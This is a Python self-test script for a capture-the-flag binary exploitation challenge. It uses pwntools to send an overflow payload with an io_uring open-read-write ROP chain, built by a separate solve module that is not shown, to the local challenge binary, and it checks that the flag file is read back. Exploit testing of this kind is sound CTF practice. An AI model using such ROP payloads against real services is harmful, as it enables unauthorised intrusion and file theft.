#!/usr/bin/env python3
"""Local-only self-test for elite_ball_knowledge.

Runs the real binary against its bundled flag.txt and verifies the io_uring ORW
ROP chain reads the flag back. No network / no remote. Exit 0 = chain works.

Usage:  uv run python test_local.py
"""
import os
import re
import sys

from pwn import context, process

context.arch = "amd64"
context.log_level = "error"  # keep output to our PASS/FAIL lines

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
from solve import BIN, OFF, build_chain  # reuse the exploit builder

DISTDIR = os.path.dirname(BIN)              # extracted dir that holds flag.txt
FLAGFILE = os.path.join(DISTDIR, "flag.txt")


def main() -> int:
    if not os.path.exists(BIN):
        print(f"[-] binary not found: {BIN}")
        return 2
    if not os.path.exists(FLAGFILE):
        print(f"[-] local flag.txt not found: {FLAGFILE}")
        return 2

    expected = open(FLAGFILE).read().strip()

    # relative path "flag.txt" -> resolved against the process cwd (DISTDIR)
    payload = b"A" * OFF + build_chain(b"flag.txt")
    assert b"\n" not in payload, "payload contains newline -> fgets would truncate"

    io = process(BIN, cwd=DISTDIR)
    io.sendline(payload)
    data = io.recvall(timeout=10) or b""
    try:
        io.close()
    except Exception:
        pass

    m = re.search(rb"grey\{[^}]*\}", data)
    flag = m.group(0).decode() if m else None

    print(f"[*] payload length : {len(payload)} bytes")
    print(f"[*] expected flag  : {expected}")
    print(f"[*] recovered flag : {flag}")

    if flag is not None and flag == expected:
        print("[+] PASS - ROP io_uring ORW chain recovered the local flag")
        return 0

    print("[-] FAIL - flag not recovered or mismatch")
    print(f"    raw output (first 80B): {data[:80]!r}")
    return 1


if __name__ == "__main__":
    sys.exit(main())
